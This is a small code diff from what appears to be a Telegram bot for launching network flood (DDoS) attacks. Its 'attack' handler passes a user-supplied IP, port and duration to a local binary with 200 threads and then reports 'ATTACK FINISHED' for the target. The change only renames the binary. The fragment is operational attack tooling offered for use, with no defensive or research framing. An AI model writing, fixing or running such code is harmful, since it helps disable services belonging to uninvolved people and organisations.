@@ -68,7 +68,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         # Binary execution - Thread count 200 for Termux stability
-        subprocess.Popen(["./@PRIMEXARMY", ip, port, duration, "200"])
+        subprocess.Popen(["./PRIMEXARMY", ip, port, duration, "200"])
         
         await asyncio.sleep(int(duration))
         await update.message.reply_text(f"✅ *ATTACK FINISHED* 🔥\nTarget: `{ip}:{port}`")
